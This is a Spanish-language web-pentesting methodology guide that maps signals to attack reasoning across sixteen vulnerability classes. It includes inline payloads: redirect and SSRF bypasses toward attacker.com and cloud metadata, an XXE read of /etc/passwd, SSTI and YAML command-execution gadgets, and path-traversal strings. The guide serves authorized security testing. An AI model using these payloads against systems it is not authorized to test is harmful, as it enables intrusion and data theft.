# Vector Interrogation — Mental Model

Cómo razonar cuando aparece una señal observable.

**Regla de uso**: este archivo NO es un checklist para ejecutar en modo
zombie. Es un mapa de preguntas. Cuando detectás una señal, razonás sobre
las preguntas de esa sección. Si la respuesta a alguna pregunta es "sí" o
"posible", **generás un checklist específico para ese caso y ese target** —
no ejecutás todo lo que figura acá.

**Regla de evidencia**: ningún vector avanza de "candidato" a "confirmado"
sin PoC técnico concreto (request/response real, callback recibido,
reflexión probada). Severidad conservadora siempre.

---

## 1. PARÁMETROS DE REDIRECT

### Señales que activan este razonamiento
Cualquier parámetro cuyo valor sea una URL o path:
`url=` `next=` `return=` `return_to=` `returnTo=` `returnUrl=`
`redirect=` `redirect_uri=` `redirect_url=` `redirectTo=`
`goto=` `go=` `forward=` `fwd=` `forward_url=`
`destination=` `dest=` `target=` `to=` `link=`
`out=` `continue=` `callback=` `successUrl=` `failUrl=`
`cancelUrl=` `from=` `origin=` `back=` `backUrl=`
`location=` `checkout_url=` `exit_url=` `after=` `post_login_redirect=`
`redir=` `r=` `u=` `q=` (cuando el valor parece URL)

### Preguntas de razonamiento

1. **¿El redirect es del servidor o del cliente?**
   - Server-side (302/301 en Location header) → open redirect explotable para phishing, OAuth token theft
   - Client-side (JS lee el param y hace `location.href=`) → posible XSS si no sanitiza

2. **¿Está en un flujo de autenticación?**
   - Si sí: open redirect post-login puede robar tokens OAuth (`code=`, `access_token=`) vía Referer o redirect controlado
   - ¿El `redirect_uri` de OAuth tiene validación estricta o solo prefix match?

3. **¿Qué validación hace el servidor?**
   - ¿Solo valida que empiece con `/`? → `//attacker.com` (protocol-relative)
   - ¿Valida el dominio? → `https://target.com.attacker.com`, `https://attacker.com?x=target.com`
   - ¿Valida con whitelist? → buscar otros parámetros del mismo tipo en otros endpoints

4. **¿Se puede combinar con algo ya encontrado?**
   - Open redirect + XSS reflejado = XSS persistente fuera del dominio original
   - Open redirect en OAuth = robo de authorization code
   - Open redirect + SSRF = pivot interno si el redirect lo hace el servidor

### Genera checklist si:
- El valor del parámetro aparece en `Location:` header de la response → checklist open redirect
- El flujo pasa por OAuth/OIDC → checklist redirect_uri bypass
- El redirect lo procesa JS sin sanitizar → agregar al triage XSS

---

## 2. IDs Y REFERENCIAS A RECURSOS

### Señales que activan este razonamiento
- ID numérico secuencial en URL: `/users/1234`, `/orders/5678`
- GUID en URL: `/items/550e8400-e29b-41d4-a716-446655440000`
- Slug predecible: `/posts/mi-articulo`, `/profile/username`
- Hash como ID: `/files/a3f2c1d4e5...`
- ID en body JSON: `{"userId": 42, "orderId": 99}`
- ID en header: `X-User-Id: 42`, `X-Account-Id: 99`
- ID en cookie: `user_id=42`
- Referencia indirecta: `/me/orders` vs `/users/42/orders`
- ID en GraphQL argument: `query { user(id: "42") { ... } }`
- ID embebido en JWT claim: `sub`, `userId`, `accountId`

### Preguntas de razonamiento

1. **¿A qué recurso apunta este ID y de quién es?**
   - ¿Es un recurso propio del usuario autenticado o puede ser de otro?
   - ¿El servidor valida que el ID pedido pertenece al usuario de la sesión?

2. **¿Qué operaciones existen sobre este ID?**
   - GET (leer) → IDOR de lectura
   - PUT/PATCH (modificar) → IDOR de escritura
   - DELETE → IDOR destructivo (mayor severidad)
   - POST con ID en body → BOLA
   - ¿Hay endpoints de admin que usan el mismo ID?

3. **¿Qué pasa si cambio el ID?**
   - Response 200 con datos de otro usuario → IDOR confirmado
   - Response 403/404 → puede haber validación, pero: ¿cambia el tiempo de respuesta? ¿el mensaje de error es diferente? (oracle de existencia)
   - Response igual → ID no se usa realmente server-side (client-side only)

4. **¿El ID es predecible o enumerable?**
   - Numérico secuencial → enumerable trivialmente
   - GUID v1 → predecible por timestamp
   - GUID v4 → no predecible, pero: ¿se expone en algún otro endpoint? ¿en emails? ¿en logs?
   - Hash → ¿de qué? si es `md5(email)` es enumerable

5. **¿El impacto real es sobre la víctima o solo sobre el atacante?**
   - Crítico: verificar desde cuenta víctima que el cambio/lectura tiene efecto real
   - Archive/mute/bookmark → típicamente per-user, sin impacto en víctima
   - Rename/addParticipant/delete → impacto global, priorizar

6. **¿Se puede combinar?**
   - IDOR de lectura + datos sensibles = information disclosure P2/P3
   - IDOR de escritura + campo de email = ATO
   - IDOR + CSRF = explotable sin interacción del atacante

### Genera checklist si:
- El ID cambiado devuelve 200 con datos distintos → checklist IDOR completo con cuenta víctima
- Existe endpoint de modificación con el mismo ID → checklist BOLA con verificación de impacto
- El ID es numérico secuencial y hay datos sensibles → priorizar

---

## 3. REFLECTION DE INPUT

### Señales que activan este razonamiento
Input del usuario aparece en la response en cualquier forma:
- En HTML body (texto visible)
- En atributo HTML: `value="INPUT"`, `href="INPUT"`, `src="INPUT"`, `action="INPUT"`
- En JSON response: `{"search": "INPUT", "results": [...]}`
- En header de response: `Location: INPUT`, `Link: INPUT`
- En mensaje de error: `"INPUT" no es válido`
- En comentario HTML: `<!-- INPUT -->`
- En JS inline: `var query = "INPUT";`
- En CSS: `style="color: INPUT"`
- En PDF/XML generado server-side
- En email enviado al usuario
- En filename de descarga (`Content-Disposition: filename="INPUT.pdf"`)

### Preguntas de razonamiento

1. **¿Dónde exactamente aparece la reflexión?**
   - En atributo HTML → ¿qué atributo? `href`/`src`/`action` son más críticos que `value`
   - En JS inline → ¿entre comillas? ¿sin comillas? ¿en un objeto JSON?
   - En HTML body → ¿hay encoding? ¿`<` se convierte en `&lt;`?

2. **¿Qué encoding se aplica (si alguno)?**
   - Sin encoding → XSS directo
   - HTML entity encoding → ¿se puede escapar del contexto igual? (ej: atributo sin comillas)
   - JS encoding → ¿se puede escapar con `\u` o sin encoding de backslash?
   - URL encoding → ¿se decodifica antes de usarse?

3. **¿El contexto permite ejecución?**
   - HTML body sin encoding → `<script>`, `<img onerror=>`
   - Atributo `href` con `javascript:` → XSS
   - JS inline entre comillas → romper comillas + código
   - CSS → `expression()` (IE), `url()` con datos

4. **¿Quién más ve esta reflexión?**
   - Solo el usuario que envió el input → XSS reflejado (requiere interacción víctima)
   - Otros usuarios ven la misma page → XSS stored (mayor severidad)
   - Admin ve el input en un panel → XSS stored que pega al admin

5. **¿El contexto es server-side?**
   - Input en PDF/Word generado → SSTI posible
   - Input en email subject/body → header injection posible
   - Input en query → SQLi, NoSQLi

6. **¿Se puede combinar?**
   - XSS reflejado + open redirect = exfiltración de tokens
   - XSS stored en panel admin = ATO del admin
   - XSS + CSRF ausente = acción forzada en nombre de víctima

### Genera checklist si:
- Input aparece sin encoding en HTML → checklist XSS con contexto específico
- Input aparece en JS inline → checklist XSS JS context
- Input aparece en PDF/email generado → checklist SSTI
- Input aparece en atributo `href`/`src`/`action` → checklist XSS attribute

---

## 4. URL/DOMAIN COMO PARÁMETRO (SSRF)

### Señales que activan este razonamiento
Parámetros que aceptan URLs o dominios externos:
`url=` `uri=` `src=` `source=` `href=` `host=` `domain=`
`endpoint=` `server=` `fetch=` `load=` `path=` (con protocolo)
`file=` `page=` `feed=` `proxy=` `api=` `webhook=`
`callback=` (URL) `import=` `export=` `target=` (URL)
`resource=` `remote=` `image_url=` `avatar_url=` `logo=`
`thumbnail=` `media=` `document=` `pdf_url=`

Funcionalidades que implican fetch externo:
- Preview de links (Slack-style unfurl)
- Import de RSS/Atom/sitemap
- Webhook de integración con URL configurable
- oembed/embed de contenido externo
- Avatar/imagen por URL externa
- Conversión de documentos (HTML→PDF, URL→screenshot)
- Import de datos desde URL externa

### Preguntas de razonamiento

1. **¿Quién hace el fetch, el servidor o el cliente?**
   - Server-side → SSRF real, el servidor contacta destinos internos
   - Client-side → open redirect o XSS, no SSRF

2. **¿Qué protocolos acepta?**
   - Solo `https://` → intentar `http://`, `ftp://`, `file://`, `dict://`, `gopher://`
   - ¿Hay validación de esquema o solo de dominio?

3. **¿Qué puede alcanzar el servidor?**
   - Cloud metadata: `169.254.169.254` (AWS IMDS), `169.254.170.2` (ECS), `metadata.google.internal`
   - Servicios internos: `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`
   - Kubernetes: `10.0.0.1`, `kubernetes.default.svc`, `169.254.169.254`
   - Docker: `172.17.0.1` (gateway típico)

4. **¿Cómo responde el servidor con distintos destinos?**
   - ¿La response incluye el contenido del fetch? → SSRF full-read
   - ¿Solo indica éxito/fallo? → SSRF ciego (necesita OOB)
   - ¿El tiempo de respuesta varía? → SSRF ciego confirmable por timing

5. **¿Hay bypass de validación?**
   - IP en decimal: `2130706433` = `127.0.0.1`
   - IP en octal: `0177.0.0.1`
   - IPv6: `[::1]`, `[::ffff:127.0.0.1]`
   - DNS rebinding: dominio propio que resuelve a IP interna
   - Redirect chain: URL externa que redirige a IP interna
   - URL con credenciales: `http://attacker.com@127.0.0.1/`
   - Doble encoding: `%252F` → `%2F` → `/`

6. **¿Se puede escalar?**
   - SSRF a metadata cloud → credenciales IAM → escalada a AWS/GCP/Azure
   - SSRF a servicio interno → pivot a red interna
   - SSRF full-read → lectura de `/etc/passwd`, source code, configs

### Genera checklist si:
- OOB callback recibido → checklist SSRF completo con targets internos
- Respuesta varía por destino → checklist SSRF ciego con timing
- Funcionalidad de webhook/import/embed presente → probar OOB primero

---

## 5. FILE UPLOAD

### Señales que activan este razonamiento
- Formulario `multipart/form-data` con campo de archivo
- Endpoint `/upload`, `/import`, `/avatar`, `/attachment`, `/media`, `/file`
- Drag-and-drop de archivos
- Paste de imagen desde clipboard
- Import de CSV/Excel/ZIP/XML
- Parámetro `filename=` en Content-Disposition
- Extensión en URL de descarga: `/files/documento.pdf`
- Processing server-side: thumbnails, conversión, OCR, antivirus scan

### Preguntas de razonamiento

1. **¿Qué tipo de archivo acepta y qué hace con él?**
   - Guarda y sirve sin procesar → path traversal en filename, content-type spoofing
   - Procesa (thumbnail, conversión) → SSRF en librerías de imagen/PDF, XXE en XML
   - Ejecuta (scripts, configs) → RCE si se puede subir código ejecutable

2. **¿Dónde se almacena el archivo?**
   - Mismo servidor web → web shell si acepta extensiones ejecutables
   - Storage externo (S3, GCS) → ACL mal configurado, public read
   - Procesado y descartado → solo importa qué hace durante el procesamiento

3. **¿Qué validaciones hace?**
   - ¿Solo valida extensión? → cambiar Content-Type, añadir doble extensión (`.php.jpg`)
   - ¿Valida Content-Type? → cambiar la extensión, mantener Content-Type válido
   - ¿Valida magic bytes? → archivo políglofa (válido como imagen Y como PHP)
   - ¿Valida contenido real? → más difícil, buscar procesadores vulnerables

4. **¿El filename se usa en algún lugar?**
   - En path de almacenamiento → path traversal (`../../../etc/cron.d/shell`)
   - En respuesta HTML → XSS si no se escapa
   - En comando del sistema → command injection
   - En base de datos → SQLi

5. **¿El archivo subido es accesible por otros usuarios?**
   - URL pública predecible → enumerable
   - URL con ID de recurso → IDOR de archivos
   - Sirve con Content-Type incorrecto → XSS via HTML servido como imagen

6. **¿El procesamiento usa librerías vulnerables?**
   - ImageMagick → RCE via MVG/SVG maliciosos (ImageTragick)
   - LibreOffice/pandoc → SSRF en conversión de documentos
   - FFmpeg → SSRF via HLS playlist maliciosa
   - PDF parsers → XXE, SSRF via `/URI` en PDF

### Genera checklist si:
- Acepta archivos de texto/código → checklist extensión bypass + web shell
- Procesa imágenes → checklist ImageMagick/polyglot
- Acepta ZIP/TAR → checklist Zip Slip (path traversal en archive)
- Filename aparece en respuesta → checklist XSS via filename
- Convierte documentos → checklist SSRF via conversión

---

## 6. JAVASCRIPT CLIENT-SIDE

### Señales que activan este razonamiento
**Sources (orígenes de datos no confiables):**
- `postMessage` + `addEventListener("message", ...)`
- `window.name`
- `document.referrer`
- `location.hash` / `location.search` / `location.href`
- `document.cookie` (si no es HttpOnly)
- `localStorage` / `sessionStorage`
- `URLSearchParams`

**Sinks (destinos peligrosos):**
- `innerHTML=` / `outerHTML=` / `insertAdjacentHTML()`
- `eval()` / `new Function()`
- `document.write()` / `document.writeln()`
- `setTimeout("string")` / `setInterval("string")`
- `location.href=` / `location.replace()` / `location.assign()`
- `src=` dinámico en `<script>` / `<img>` / `<iframe>`
- `srcdoc=`
- Template literals con input sin sanitizar
- `.html()` de jQuery
- `dangerouslySetInnerHTML` en React
- `v-html` en Vue
- `[innerHTML]` en Angular (sin DomSanitizer)

### Preguntas de razonamiento

1. **¿Hay un flow source → sink sin sanitización?**
   - ¿El dato del source llega al sink directamente o pasa por algún filtro?
   - ¿Qué filtro? ¿DOMPurify? ¿encoding manual? ¿whitelist de tags?

2. **¿`postMessage` valida el origen del mensaje?**
   - ¿Hay `event.origin` check? ¿Es estricto o solo prefix?
   - ¿Sin check de origen? → cualquier página puede enviar mensajes
   - ¿Qué hace el handler con el mensaje? ¿Lo mete en el DOM?

3. **¿`location.hash` se usa como source?**
   - Hash no se envía al servidor → bypass de WAF/logs
   - ¿Se parsea con `decodeURIComponent`? → double encoding posible
   - ¿Qué sink usa? ¿`innerHTML`? ¿`location.href`?

4. **¿Hay prototype pollution posible?**
   - ¿Se hace merge/extend de objetos con input del usuario?
   - `Object.assign({}, userInput)`, `$.extend(true, {}, userInput)`
   - ¿`__proto__` o `constructor.prototype` en params de URL?
   - ¿Hay gadgets que conviertan pollution en XSS/RCE?

5. **¿Los source maps están en producción?**
   - `.js.map` accesible → código fuente original legible
   - Buscar secrets, endpoints internos, lógica de negocio no documentada

6. **¿Hay JSONP endpoints?**
   - `callback=` con función arbitraria → XSS si la response no tiene Content-Type correcto

### Genera checklist si:
- `postMessage` sin validación de origen + sink peligroso → checklist postMessage XSS
- `location.hash` → `innerHTML` → checklist DOM XSS via hash
- Source maps accesibles → leer código fuente y buscar endpoints/secrets
- Prototype pollution posible → checklist gadgets del framework en uso

---

## 7. AUTENTICACIÓN Y SESIÓN

### Señales que activan este razonamiento
- JWT en response (header `Authorization`, body, cookie)
- OAuth `code` en URL
- Parámetro `state` en OAuth
- Token en URL (no en header)
- Cookies con/sin flags `HttpOnly`/`Secure`/`SameSite`
- Endpoint de reset de password
- Magic links
- `remember_me` cookie
- Múltiples tabs/dispositivos aceptados

### Preguntas de razonamiento

1. **¿El JWT se valida correctamente?**
   - ¿Acepta algoritmo `none`? → forjar tokens sin firma
   - ¿Acepta cambio de `alg: RS256` a `alg: HS256` con clave pública como secret?
   - ¿El `iss` (issuer) se valida?
   - ¿El `aud` (audience) se valida?
   - ¿El `exp` (expiration) se valida?
   - ¿El `kid` (key ID) en header se usa en query? → SQLi/path traversal en kid

2. **¿El flujo OAuth es seguro?**
   - ¿Hay parámetro `state`? ¿Es aleatorio? → CSRF en OAuth si no
   - ¿El `redirect_uri` tiene validación estricta o prefix match?
   - ¿El `code` expira rápido? ¿Se invalida después de un uso?
   - ¿Hay PKCE? → si no, code interception posible
   - ¿`response_type=token` (implicit flow)? → token en URL, leak en logs/Referer

3. **¿Las cookies tienen los flags correctos?**
   - Sin `HttpOnly` → XSS roba la sesión (aumenta severidad de cualquier XSS)
   - Sin `Secure` → sesión interceptable en HTTP
   - Sin `SameSite` → CSRF posible
   - `SameSite=None` sin `Secure` → inválido en browsers modernos

4. **¿El reset de password es seguro?**
   - ¿El token expira? ¿En cuánto tiempo?
   - ¿El token es de suficiente entropía?
   - ¿El token se invalida después de usarse?
   - ¿El token se invalida si el usuario cambia su email?
   - ¿El link de reset tiene el token en la URL? → leak en Referer/logs

5. **¿Hay user enumeration?**
   - ¿La respuesta de "email no registrado" es diferente a "contraseña incorrecta"?
   - ¿El tiempo de respuesta varía entre usuario existente y no existente?
   - ¿El reset de password dice "email enviado" siempre o solo si existe?

6. **¿Las sesiones se invalidan correctamente?**
   - ¿Logout invalida el token server-side o solo borra la cookie?
   - ¿Cambiar password invalida sesiones anteriores?
   - ¿Hay límite de sesiones activas simultáneas?

### Genera checklist si:
- JWT presente → checklist JWT attacks (none/alg confusion/kid injection)
- OAuth flow → checklist OAuth misconfig (state/redirect_uri/PKCE)
- Cookie sin HttpOnly + XSS encontrado → elevar severidad del XSS a ATO
- Reset de password con token en URL → checklist token leak

---

## 8. GRAPHQL

### Señales que activan este razonamiento
Endpoints: `/graphql` `/api/graphql` `/v1/graphql` `/query` `/gql`
Headers: `Content-Type: application/json` con body `{"query": "..."}`
Respuestas con estructura `{"data": {...}, "errors": [...]}`

### Preguntas de razonamiento

1. **¿La introspección está habilitada?**
   - `{"query": "{__schema{types{name}}}"}` → si responde con tipos, introspección abierta
   - Mapear todos los tipos, queries, mutations, subscriptions
   - Buscar queries/mutations de admin que no aparecen en la UI

2. **¿Hay queries o mutations sin auth check?**
   - Comparar queries autenticado vs no autenticado
   - ¿Mutations de admin son accesibles con token de usuario normal?
   - ¿Hay campos de usuario en queries que devuelven datos de otros?

3. **¿Hay depth/complexity limit?**
   - Query anidada profunda → DoS si no hay límite
   - `{ user { friends { friends { friends { ... } } } } }`

4. **¿Hay batch queries?**
   - Array de queries en un request → bypass de rate limit
   - `[{"query": "login(...)"}, {"query": "login(...)"}, ...]`

5. **¿Los aliases permiten bypass?**
   - `{ a: login(user:"a", pass:"1"), b: login(user:"a", pass:"2"), ... }`
   - Múltiples intentos de login en un request → bypass de rate limit por request

6. **¿Los field suggestions están habilitados?**
   - Typo en nombre de campo → el servidor sugiere nombres parecidos → enumeration de schema sin introspección

7. **¿Hay IDOR en los argumentos?**
   - `{ user(id: "OTRO_ID") { email, phone } }` → mismo análisis que sección 2

### Genera checklist si:
- Introspección abierta → mapear schema completo y buscar mutations de admin
- Mutations sin auth check → checklist BOLA/IDOR en GraphQL
- Sin depth limit → documentar como DoS candidato (P4)
- Batch/alias disponible → checklist rate limit bypass

---

## 9. CACHE

### Señales que activan este razonamiento
Headers en response:
`Age:` `X-Cache:` `CF-Cache-Status:` `Via:` `X-Served-By:`
`Surrogate-Key:` `Cache-Control: public` `Surrogate-Control:`
`X-Cache-Hits:` `X-Varnish:` `X-Drupal-Cache:` `Fastly-Cache-Tags:`

### Preguntas de razonamiento

1. **¿La response se está cacheando?**
   - `Age: >0` o `X-Cache: HIT` → se está sirviendo desde cache
   - Hacer dos requests idénticos y comparar → si el segundo es más rápido o tiene `Age`, hay cache

2. **¿Qué determina la cache key?**
   - ¿Solo la URL? → headers no cacheados como key (oportunidad de poisoning)
   - ¿Incluye cookies? → si no, respuestas autenticadas podrían cachearse para todos
   - ¿Incluye `Vary` headers? → qué headers afectan la key

3. **¿Hay headers que afectan la respuesta pero no la cache key?**
   - `X-Forwarded-Host` → si se refleja en la respuesta pero no es cache key → poisoning
   - `X-Forwarded-For` → idem
   - `X-Original-URL` → idem
   - `Accept-Language` → si cambia el contenido pero no está en Vary

4. **¿La response cacheada contiene datos sensibles?**
   - ¿Hay cookies de sesión, tokens, datos de usuario en la response?
   - ¿La cache key incluye la cookie de sesión? → si no, datos de un usuario se sirven a otro (cache deception)

5. **¿Hay cache deception posible?**
   - `/profile/sensitive.css` → ¿el server sirve `/profile/` con datos del usuario? ¿el cache lo guarda por la extensión `.css`?
   - Path traversal en cache: `/api/user/..%2F..%2Fstatic/app.js`

6. **¿Hay purge endpoints?**
   - `/cdn-cgi/cache/purge`, `/cache/clear`, etc. → ¿accesibles sin auth?

### Genera checklist si:
- Header no en cache key se refleja en response → checklist cache poisoning
- Response con datos de usuario no tiene cache key que incluya sesión → checklist cache deception
- `X-Cache: HIT` en endpoint con datos sensibles → documentar, investigar cache key

---

## 10. HEADERS HTTP COMO INPUT

### Señales que activan este razonamiento
Headers que el servidor puede procesar y reflejar:
`X-Forwarded-Host:` `X-Forwarded-For:` `X-Original-URL:`
`X-Rewrite-URL:` `X-Custom-IP-Authorization:` `Forwarded:`
`Host:` (override) `Referer:` `User-Agent:` `Origin:`
Headers custom de la app: `X-Api-Key:` `X-Request-Id:` `X-Tenant-Id:`

### Preguntas de razonamiento

1. **¿El header se refleja en la response?**
   - En HTML body → XSS via header
   - En `Location:` → open redirect via header
   - En otro header → header injection

2. **¿El header afecta el routing o la lógica?**
   - `X-Forwarded-Host` → ¿el server genera URLs absolutas basándose en este header? → host header injection
   - `X-Forwarded-For` → ¿el server confía en esta IP para auth o rate limiting? → bypass
   - `X-Original-URL` / `X-Rewrite-URL` → ¿override de la URL procesada? → access control bypass

3. **¿El `Host` header se puede manipular?**
   - Password reset que genera link con `Host` header → poisoning del link de reset
   - Aplicación multi-tenant que usa `Host` para determinar tenant → tenant confusion

4. **¿El `Origin` header determina CORS?**
   - ¿Se refleja en `Access-Control-Allow-Origin`? → CORS misconfiguration
   - ¿Acepta `null`? → iframe sandbox attack
   - ¿Acepta subdominios? → XSS en subdominio → CORS bypass

5. **¿Hay bypass de auth por IP?**
   - `X-Forwarded-For: 127.0.0.1` → ¿el server cree que el request viene de localhost?
   - `X-Custom-IP-Authorization: 127.0.0.1` → idem
   - `True-Client-IP:` / `CF-Connecting-IP:` → idem

### Genera checklist si:
- Header se refleja en response sin encoding → checklist XSS/injection via header
- `X-Forwarded-Host` afecta URLs generadas → checklist host header injection
- `X-Forwarded-For` bypasea rate limit → documentar como P4, buscar auth bypass

---

## 11. INFORMACIÓN EXPUESTA

### Señales que activan este razonamiento
- Stack trace en response de error
- Versión de software en header (`Server:`, `X-Powered-By:`, `X-AspNet-Version:`)
- Path absoluto en mensaje de error
- Variables de entorno en response
- Comentarios HTML con info interna
- Source maps en producción (`*.map`)
- `.git/` accesible (`/.git/config`, `/.git/HEAD`)
- `/.env` accesible
- `/actuator` (Spring Boot)
- `/debug` / `/phpinfo.php` / `/server-info`
- Secrets en JS bundle
- Health endpoints verbose
- Metadata de archivos (EXIF, propiedades de Office)
- Directorios con listing habilitado

### Preguntas de razonamiento

1. **¿La información expuesta habilita un ataque concreto?**
   - Versión exacta + CVE conocido → escalada directa
   - Path absoluto → revela estructura del servidor, útil para path traversal
   - Stack trace → revela tecnología, versiones, a veces datos internos
   - Credenciales en `.env` → acceso directo

2. **¿Los source maps revelan lógica no documentada?**
   - Endpoints internos no expuestos en la UI
   - Validaciones client-side que se pueden bypassear
   - Secrets hardcodeados (API keys, tokens)
   - Comentarios de desarrolladores con info sensible

3. **¿El `.git/` accesible permite reconstruir el código fuente?**
   - `/.git/config` → remoto del repo
   - `/.git/COMMIT_EDITMSG` → último commit
   - Con `git-dumper` → código fuente completo reconstruible

4. **¿El actuator de Spring Boot expone info útil?**
   - `/actuator/env` → variables de entorno con passwords
   - `/actuator/mappings` → todos los endpoints de la app
   - `/actuator/beans` → estructura de la aplicación
   - `/actuator/heapdump` → dump de memoria con posibles credenciales

5. **¿Los metadatos de archivos revelan info interna?**
   - EXIF en imágenes → GPS, dispositivo, usuario del SO
   - Propiedades de Office → autor, empresa, rutas internas, historial de revisiones

### Genera checklist si:
- Versión exacta de software → buscar CVEs para esa versión específica
- `.git/` accesible → checklist git dumping
- `/actuator` sin auth → checklist actuator endpoints
- Source maps en producción → leer código y buscar endpoints/secrets
- `.env` accesible → leer y documentar como P1 inmediato

---

## 12. LÓGICA DE NEGOCIO

### Señales que activan este razonamiento
- Precio en request body: `{"price": 99.99, "quantity": 1}`
- Descuentos/cupones aplicables
- Flujos de pago multi-paso
- Estados de órdenes/transacciones
- Límites de uso (intentos, cuota, rate)
- Roles/permisos en request
- Feature flags en request o cookie
- Operaciones que deben ser únicas (compra única, voto único)

### Preguntas de razonamiento

1. **¿El servidor confía en valores del cliente que debería calcular él mismo?**
   - Precio enviado por el cliente → cambiarlo a 0 o negativo
   - Descuento calculado client-side → manipular porcentaje
   - Cantidad negativa → ¿el total se vuelve negativo? ¿crédito gratis?

2. **¿Los pasos del flujo se validan en orden?**
   - ¿Se puede saltar el paso de pago y ir directo a "orden confirmada"?
   - ¿El estado de una orden se puede manipular directamente?
   - ¿El endpoint del último paso verifica que el anterior se completó?

3. **¿Hay race conditions?**
   - Operación de uso único (cupón, bono de bienvenida) → dos requests simultáneos
   - Transferencia de fondos → enviar simultáneamente desde la misma cuenta
   - Chequeo de saldo antes de descontar → TOCTOU

4. **¿Los roles/permisos vienen del cliente?**
   - `{"role": "user"}` en JWT o body → cambiar a `"admin"`
   - `{"isAdmin": false}` → cambiar a `true`
   - Feature flag en cookie → cambiar para habilitar función premium

5. **¿Hay límites de uso sin validación server-side?**
   - Rate limit solo client-side (JS) → bypasseable
   - Cupón sin límite de uso real
   - "Una sola cuenta por usuario" sin verificación de identidad real

### Genera checklist si:
- Precio/cantidad en request → checklist price manipulation
- Flujo multi-paso → checklist step bypass
- Operación única → checklist race condition
- Rol en request → checklist privilege escalation

---

## 13. FORMULARIOS Y CSRF

### Señales que activan este razonamiento
- Formulario HTML sin campo `_csrf` / `csrf_token`
- Token CSRF presente pero en URL (no en body/header)
- Endpoints que mutan estado (POST/PUT/DELETE/PATCH)
- Cookie sin `SameSite`
- CORS permisivo en endpoints que mutan estado
- Endpoint que acepta `GET` pero muta estado

### Preguntas de razonamiento

1. **¿Hay token CSRF presente?**
   - No hay token → CSRF directo si la cookie no tiene `SameSite=Strict/Lax`
   - Token en URL → leak en Referer/logs, reutilizable
   - Token no atado a sesión → cualquier token válido sirve para cualquier usuario
   - Token predecible → forjable

2. **¿La cookie tiene `SameSite`?**
   - `SameSite=Strict` → CSRF no es posible (el browser no envía la cookie cross-site)
   - `SameSite=Lax` → CSRF posible solo en navegación top-level (link), no en fetch/XHR
   - Sin `SameSite` o `SameSite=None` → CSRF completamente posible

3. **¿El endpoint acepta JSON?**
   - `Content-Type: application/json` con `SameSite` ausente → ¿acepta también `text/plain`? → CSRF posible con form
   - ¿Verifica el Content-Type? Si no → CSRF con form que envía JSON-like body

4. **¿Algún endpoint GET muta estado?**
   - GET que cambia email, password, configuración → CSRF trivial (solo un `<img src="">`)

5. **¿El CORS de la app permite credenciales desde cualquier origen?**
   - `Access-Control-Allow-Origin: *` con `Access-Control-Allow-Credentials: true` → inválido en browsers modernos pero revisar implementación
   - `Access-Control-Allow-Origin: <origin del atacante>` con credentials → CORS bypass completo

### Genera checklist si:
- Sin CSRF token + sin SameSite → checklist CSRF con PoC de form
- Token no atado a sesión → checklist CSRF token bypass
- GET que muta estado → CSRF trivial, documentar con PoC

---

## 14. SERIALIZACIÓN Y PARSING

### Señales que activan este razonamiento
- `Content-Type: application/xml` o body XML en cualquier endpoint
- `Content-Type: application/x-java-serialized-object`
- Cookies o params con formato `O:8:"ClassName":...` (PHP serialize)
- `viewstate` en ASP.NET WebForms
- YAML en body (`Content-Type: application/yaml`)
- Pickle en Python APIs
- Response con objetos serializados

### Preguntas de razonamiento

1. **¿El endpoint acepta XML?**
   - ¿Procesa entidades externas? → XXE
   - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` → ¿resuelve la entidad?
   - XXE OOB si la response no refleja la entidad directamente

2. **¿Hay deserialización insegura?**
   - PHP `unserialize()` con input controlado → RCE con gadget chains
   - Java deserialización → ysoserial gadgets
   - Python pickle → RCE directo
   - ¿La app usa una librería con gadgets conocidos (Commons Collections, Spring, etc.)?

3. **¿El viewstate de ASP.NET está protegido?**
   - ¿Tiene MAC? → si no, modificable → deserialización insegura
   - ¿Está encriptado? → si no, información sensible en el viewstate

4. **¿JSON tiene prototype pollution?**
   - `{"__proto__": {"isAdmin": true}}` → ¿afecta objetos downstream?
   - `{"constructor": {"prototype": {"isAdmin": true}}}` → variante

5. **¿YAML se parsea con `yaml.load()` (sin safe_load)?**
   - Python: `yaml.load()` ejecuta código arbitrario → RCE
   - `!!python/object/apply:os.system ["id"]`

### Genera checklist si:
- XML aceptado → checklist XXE (interno + OOB)
- Serialización PHP/Java detectada → checklist deserialización con ysoserial/phpggc
- viewstate sin MAC → checklist viewstate tampering

---

## 15. TEMPLATE INJECTION (SSTI)

### Señales que activan este razonamiento
- Input de usuario aparece en emails generados server-side
- Input de usuario aparece en PDFs generados server-side
- Input de usuario aparece en documentos Word/Excel generados
- Campos como "asunto del email", "nombre en factura", "mensaje personalizado"
- Preview de templates con input del usuario
- Motor de templates visible en stack trace o headers

### Preguntas de razonamiento

1. **¿El input se procesa como template o solo como dato?**
   - Enviar `{{7*7}}` → si la response muestra `49`, hay SSTI
   - Enviar `${7*7}` → idem para EL/Mako
   - Enviar `<%= 7*7 %>` → idem para ERB/EJS
   - Enviar `*{7*7}` → idem para Thymeleaf
   - Si muestra el literal `{{7*7}}` → probablemente no hay SSTI (o encoding)

2. **¿Qué motor de templates se usa?**
   - Jinja2 (Python): `{{config}}`, `{{self.__class__.__mro__}}`
   - Twig (PHP): `{{_self.env.display("id")}}`
   - Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
   - Pebble (Java): `{{"freemarker.template.utility.Execute"?new().execute("id")}}`
   - Smarty (PHP): `{php}echo `id`;{/php}`
   - Velocity (Java): `#set($x='') #set($rt=$x.class.forName('java.lang.Runtime'))`

3. **¿Hay impacto real o solo matemática?**
   - `{{7*7}}` → `49` es detección, no PoC
   - Escalar a lectura de archivos o ejecución de comandos para PoC real
   - Si no se puede escalar → documentar como P3 (confirmed SSTI sin RCE)

### Genera checklist si:
- `{{7*7}}` resuelve a `49` → checklist SSTI por motor detectado

---

## 16. PATH TRAVERSAL Y FILE INCLUSION

### Señales que activan este razonamiento
Parámetros que referencian archivos o paths:
`file=` `path=` `page=` `template=` `include=` `doc=`
`folder=` `dir=` `load=` `read=` `view=` `download=`
`filename=` en Content-Disposition
`lang=` (para inclusión de archivos de idioma)
ZIP/TAR uploads con paths en los entries

### Preguntas de razonamiento

1. **¿El parámetro se usa para leer un archivo del sistema?**
   - `../` → ¿traversal básico?
   - `..%2F` → URL encoding del slash
   - `....//` → doble punto para bypassear filtros de `../`
   - `%00` (null byte) → ¿trunca la extensión forzada?
   - `..;/` → bypass en algunas implementaciones Java

2. **¿Hay extensión forzada?**
   - El servidor añade `.php` o `.html` al valor → null byte para truncar
   - Wrapper: `php://filter/convert.base64-encode/resource=index`

